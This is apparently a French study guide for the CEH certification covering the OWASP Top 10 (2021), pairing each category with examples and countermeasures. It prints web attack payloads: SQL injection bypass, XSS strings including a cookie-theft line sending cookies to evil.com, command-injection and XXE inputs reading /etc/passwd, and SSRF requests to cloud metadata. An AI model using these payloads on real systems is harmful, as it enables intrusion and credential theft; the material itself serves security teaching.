# 🔴 Module 14 — OWASP Top 10 (2021)

> **CEH v13 | EC-Council**  
> `#OWASP` `#BrokenAccess` `#Injection` `#XSS` `#SSRF` `#Top10`

---

## 📌 Table des matières

1. [A01 — Broken Access Control](#a01--broken-access-control)
2. [A02 — Cryptographic Failures](#a02--cryptographic-failures)
3. [A03 — Injection](#a03--injection)
4. [A04 — Insecure Design](#a04--insecure-design)
5. [A05 — Security Misconfiguration](#a05--security-misconfiguration)
6. [A06 — Vulnerable and Outdated Components](#a06--vulnerable-components)
7. [A07 — Identification and Authentication Failures](#a07--authentication-failures)
8. [A08 — Software and Data Integrity Failures](#a08--integrity-failures)
9. [A09 — Security Logging and Monitoring Failures](#a09--logging-failures)
10. [A10 — Server-Side Request Forgery (SSRF)](#a10--ssrf)

---

## A01 — Broken Access Control

**Rang #1 — 94% des applications testées avaient des problèmes de contrôle d'accès**

```
Exemples :
- Accéder à l'URL /admin sans être admin (force browsing)
- IDOR : https://site.com/user/profile?id=123 → changer id=456 (autre utilisateur)
- Élévation de privilège : POST /api/admin/addUser (sans être admin)
- CORS mal configuré → accès cross-origin non autorisé

Payload IDOR :
GET /api/v1/users/1001/orders HTTP/1.1   ← Mon ID
→ Modifier en : GET /api/v1/users/1002/orders   ← ID d'un autre utilisateur
```

**Contre-mesures :**
- Vérification d'autorisation côté serveur (pas seulement côté client)
- Deny by default (refuser si non explicitement autorisé)
- Rate limiting sur les endpoints sensibles
- Logs d'accès aux ressources sensibles

---

## A02 — Cryptographic Failures

```
Exemples :
- Données sensibles en clair dans la DB (mots de passe non hashés)
- MD5 / SHA-1 pour les mots de passe (cassables avec rainbow tables)
- HTTP (non HTTPS) pour données sensibles
- Clés de chiffrement faibles ou hardcodées
- Algorithmes obsolètes : DES, RC4, 3DES

Test :
- Vérifier que HTTPS est obligatoire
- Vérifier le stockage des mots de passe (bcrypt vs MD5)
- Chercher des données sensibles dans les logs
```

**Contre-mesures :**
- AES-256 pour chiffrement, SHA-256+ pour hachage
- bcrypt/Argon2 pour les mots de passe
- HTTPS partout (HSTS)
- Ne jamais stocker de données sensibles non nécessaires

---

## A03 — Injection

**Inclut : SQLi, XSS, Command Injection, LDAP injection, NoSQL injection**

### SQL Injection

```sql
-- Formulaire login vulnérable :
SELECT * FROM users WHERE user='$input' AND pass='$pass'

-- Payload bypass :
user: ' OR '1'='1
-- Requête : SELECT * FROM users WHERE user='' OR '1'='1' AND pass='xxx'
-- → 1=1 est toujours vrai → connexion sans mot de passe
```

### XSS (Cross-Site Scripting)

```
Types :
- Reflected : payload dans l'URL, exécuté immédiatement
- Stored    : payload stocké en DB, exécuté pour chaque visiteur
- DOM-based : manipulation du DOM côté client (sans passer par le serveur)

Payloads basiques :
<script>alert('XSS')</script>
<img src=x onerror="alert(1)">
<svg onload="alert(1)">
javascript:alert(1)  ← Dans un href

Vol de cookie :
<script>document.location='http://evil.com/?c='+document.cookie</script>
```

### Command Injection

```bash
# Application vulnérable (Python Flask) :
@app.route('/ping')
def ping():
    host = request.args.get('host')
    result = os.system(f"ping -c 1 {host}")  ← Dangereux !
    
# Exploitation :
http://site.com/ping?host=127.0.0.1; cat /etc/passwd
http://site.com/ping?host=127.0.0.1 && id
http://site.com/ping?host=127.0.0.1 | ls -la
```

**Contre-mesures :**
- Requêtes paramétrées (prepared statements) pour SQLi
- Encodage output pour XSS
- Éviter les appels système avec entrées utilisateurs

---

## A04 — Insecure Design

```
Ce que c'est :
→ Absence de conception sécurisée (pas seulement une implémentation défectueuse)
→ Pas de threat modeling
→ Pas de modèle de menace défini lors de la conception

Exemples :
- Application de réinitialisation de MDP qui accepte "0000" comme code SMS
- E-commerce permettant des quantités négatives (crédit infini)
- Workflow d'inscription sans validation email

Contre-mesures :
- Threat modeling (STRIDE, DREAD)
- Secure Design Patterns
- User stories avec critères de sécurité
```

---

## A05 — Security Misconfiguration

```
Exemples :
- Comptes/mots de passe par défaut actifs
- Pages d'erreur verbose exposant stack traces
- Ports ouverts non nécessaires
- Permissions de fichiers trop permissives
- Clés cloud hardcodées dans le code (GitHub leak)
- CORS avec Allow-Origin: * + credentials
- XML External Entity (XXE) activé

Test XXE :
POST /api/parse HTTP/1.1
Content-Type: application/xml

<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
<root><data>&xxe;</data></root>
→ Si vulnérable, retourne le contenu de /etc/passwd !
```

**Contre-mesures :**
- Configuration par défaut sécurisée ("secure by default")
- Processus de hardening documenté et automatisé
- Désactiver les parsers XML externes

---

## A06 — Vulnerable and Outdated Components

```
Exemples :
- Log4Shell (CVE-2021-44228) via Log4j 2.x
- Apache Struts RCE (Equifax breach)
- WordPress plugins vulnérables
- Node.js packages avec vulnérabilités connues

Vérification :
# npm (JavaScript) :
npm audit
npm audit fix

# Python :
pip-audit
safety check

# Java (Maven) :
mvn dependency-check:check

# Scan général :
OWASP Dependency-Check
Snyk
```

---

## A07 — Identification and Authentication Failures

```
Exemples :
- Pas de brute force protection (tentatives illimitées)
- Mots de passe faibles autorisés ("password123")
- IDs de session prévisibles
- Session non invalidée au logout (côté serveur)
- Récupération de MDP par questions secrètes faciles
- Pas de MFA sur comptes sensibles

Test :
- Essayer : admin/admin, admin/password, test/test
- Tenter brute force sur la page de login
- Vérifier que la session est invalidée après logout (Burp Suite)
```

---

## A08 — Software and Data Integrity Failures

```
Exemples :
- Pipeline CI/CD sans vérification de signature
- Désérialisation non sécurisée
- Mise à jour auto depuis sources non fiables

Désérialisation PHP :
O:4:"User":2:{s:4:"name";s:5:"alice";s:4:"role";s:5:"admin";}
→ Modifier "role" en "admin" avant envoi → Élévation de privilège

SolarWinds (2020) : Mise à jour logicielle compromise → Supply chain attack
```

---

## A09 — Security Logging and Monitoring Failures

```
Exemples :
- Les tentatives de connexion échouées ne sont pas loggées
- Les logs ne sont pas surveillés
- Absence d'alerting en temps réel
- Logs effaçables par l'attaquant (pas de SIEM centralisé)

Impact : Un attaquant peut opérer pendant des mois sans être détecté.
Dwell time moyen (2023) : ~207 jours avant détection d'une brèche

Bonnes pratiques :
- Logger toutes les tentatives d'auth (succès et échecs)
- SIEM centralisé (logs immuables)
- Alertes en temps réel sur les anomalies
- Test régulier des alertes (purple teaming)
```

---

## A10 — SSRF (Server-Side Request Forgery)

```
Exploitation :
URL vulnérable : https://site.com/fetch?url=https://external.com/image.png

Payloads SSRF :
https://site.com/fetch?url=http://localhost/admin              ← Admin interne
https://site.com/fetch?url=http://192.168.1.1/               ← Réseau interne
https://site.com/fetch?url=http://169.254.169.254/latest/     ← AWS Metadata
https://site.com/fetch?url=file:///etc/passwd                 ← Lecture locale
https://site.com/fetch?url=dict://localhost:6379/             ← Redis interne

AWS SSRF → Metadata → IAM credentials → Compromission cloud !
```

**Contre-mesures :**
- Whitelist des URL autorisées
- Désactiver les schémas non nécessaires (file://, dict://)
- IMDSv2 sur AWS (nécessite token préalable)

---

## 🧠 Points clés à retenir pour l'examen

| # | Catégorie | Mot-clé |
|---|-----------|---------|
| A01 | Broken Access Control | IDOR, force browsing |
| A02 | Cryptographic Failures | Données en clair, MD5 |
| A03 | Injection | SQLi, XSS, Command injection |
| A04 | Insecure Design | Absence threat modeling |
| A05 | Misconfiguration | XXE, defaults, verbose errors |
| A06 | Outdated Components | Log4Shell, npm audit |
| A07 | Auth Failures | Brute force, session |
| A08 | Integrity Failures | Désérialisation, supply chain |
| A09 | Logging Failures | Pas de monitoring |
| A10 | SSRF | Metadata cloud, réseau interne |

---

*⬅️ [Concepts fondamentaux](./01_concepts_fondamentaux.md) | ➡️ [Techniques d'attaques](./03_techniques_attaques.md)*
